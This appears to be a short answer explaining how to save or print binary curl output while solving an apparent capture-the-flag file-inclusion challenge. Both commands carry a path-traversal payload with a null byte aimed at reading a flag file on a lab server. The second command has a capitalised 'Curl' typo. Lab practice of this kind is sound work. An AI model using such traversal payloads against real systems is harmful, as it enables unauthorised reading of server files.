The warning you're seeing is because you're sending binary output to your terminal, which can potentially mess up its display. You can overcome this situation by using the `-o` or `--output` option in cURL to redirect the output to a file instead of displaying it directly in the terminal. Here's how you can do it:

**FIRST APPROACH**

`curl http://10.10.203.18/challenges/chall3.php -d 'method=POST&file=../../../../../etc/flag3%00' -o flag3.txt`


NOTE: In the approach of above, it will generate a .txt file 
This command will send the POST request to the URL with the specified data and save the output into a file named `flag3.txt`. You can then view the content of the file safely without worrying about terminal display issues.


==SECOND APPROACH==
Curl http://10.10.203.18/challenges/chall3.php -d 'method=POST&file=../../../../../etc/flag3%00' --output -

It will be printed in the terminal
